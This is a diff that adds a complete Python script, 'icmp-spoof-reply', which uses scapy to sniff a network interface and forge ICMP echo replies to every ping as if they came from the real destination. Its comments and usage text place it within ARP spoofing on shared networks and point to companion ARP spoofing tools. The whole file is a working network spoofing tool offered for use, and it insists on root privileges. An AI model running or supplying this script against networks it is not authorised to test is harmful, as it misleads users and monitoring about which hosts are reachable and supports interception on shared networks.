@@ -1,0 +1,73 @@
+#!/usr/bin/env python3
+#
+# icmp-spoof-reply: ICMP spoof reply.
+#
+# When in a shared network or ARP spoofing, this script will reply to ALL
+# ICMP PING requests as though it came from the destination.
+#
+# Note: This does not cover the who has ARP requests to beat destination
+#       unknowns, you gotta fix that yourself.
+# Hint: Use arp-broadcast-spoof, Luke.
+#
+# (c) chinarulezzz, drop at chinarulezzz dot fun
+
+from scapy.all import *
+
+def icmp_reply_spoof(interface):
+    def spoof(request):
+        if request.haslayer('ICMP') and request[ICMP].type == 8:
+            print(f"ICMP request from {request[IP].src} to {request[IP].dst}")
+            response = Ether()/IP()/ICMP()/""
+
+            response[Ether].dst = request[Ether].src
+            response[Ether].src = request[Ether].dst
+
+            response[IP].src    = request[IP].dst
+            response[IP].dst    = request[IP].src
+
+            response[ICMP].type = 0
+            response[ICMP].id   = request[ICMP].id
+            response[ICMP].seq  = request[ICMP].seq
+
+            response[Raw].load  = request[Raw].load
+
+            print(f"ICMP response to {response[IP].dst} as {response[IP].src}")
+            sendp(response, iface=interface)
+
+    sniff(prn=spoof, iface=interface)
+
+def usage(program):
+    print(f"""
+[ ICMP Spoof Reply ]---------------------------------------------------
+
+When a shared network or ARP spoofing, this script will reply to ALL
+ICMP PING requests as though it came from the destination.
+
+Note: This does not cover the who has ARP requests to beat destination
+      unknowns. you gotta fix that yourself.
+
+Hint: Use arp-spoof-flood, Luke!
+-----------------------------------------------------------------------
+Usage: {program} interface
+""")
+
+if __name__ == '__main__':
+    import sys
+
+    if len(sys.argv) > 1:
+        if sys.argv[1] == '-h' or sys.argv[1] == '--help':
+            usage(sys.argv[0])
+            sys.exit(1)
+        else:
+            interface = sys.argv[1]
+    else:
+        interface = get_working_if()
+
+    if os.getuid() != 0:
+        print ("Must be superuser.")
+        sys.exit(1)
+
+    icmp_reply_spoof(interface)
+
+# vim:sw=4:ts=4:sts=4:et:cc=80
+# End of file
